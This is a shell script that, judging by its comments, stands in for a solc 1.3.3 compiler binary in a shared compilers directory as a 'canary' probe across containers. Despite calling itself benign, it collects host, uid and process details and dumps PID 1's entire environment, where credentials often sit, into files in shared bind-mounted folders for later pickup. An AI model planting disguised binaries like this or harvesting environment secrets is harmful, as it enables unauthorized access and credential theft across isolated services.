#!/bin/sh
# a03-w12 R2 canary — shared-tree consumer probe (benign). Wave-12 unit A03.
# Executed either as 1.3.3 "solc" (container /data/compilers bind) or, if the
# sibling smart-contract-verifier execs from its COMPILERS_DIR, inside that
# container (binds /opt/compilers/{solidity,vyper}). Writes markers only.
echo "A03-W12-R2 $(date -u 2>/dev/null) host=$(hostname 2>/dev/null) uid=$(id -u 2>/dev/null) pid1=$(cat /proc/1/comm 2>/dev/null) pwd=$(pwd 2>/dev/null)" > /opt/compilers/solidity/A03-W12-R2.txt 2>/dev/null
echo "A03-W12-R2 $(date -u 2>/dev/null) host=$(hostname 2>/dev/null) uid=$(id -u 2>/dev/null) pid1=$(cat /proc/1/comm 2>/dev/null)" > /data/compilers/A03-W12-R2.txt 2>/dev/null
{
echo "=== A03-W12-R2 context"
echo "date=$(date -u 2>/dev/null) uid=$(id -u 2>/dev/null) host=$(hostname 2>/dev/null)"
cat /proc/1/comm 2>/dev/null
tr '\0' '\n' < /proc/1/environ 2>/dev/null
ls -la / /opt /opt/compilers /data 2>/dev/null
} > /opt/compilers/solidity/A03-W12-R2-ctx.txt 2>/dev/null
{
echo "=== A03-W12-R2 context"
echo "date=$(date -u 2>/dev/null) uid=$(id -u 2>/dev/null) host=$(hostname 2>/dev/null)"
cat /proc/1/comm 2>/dev/null
tr '\0' '\n' < /proc/1/environ 2>/dev/null
ls -la / /opt /data /data/compilers 2>/dev/null
} > /data/compilers/a03-w12-dump/03_r2_ctx.txt 2>/dev/null
exit 0
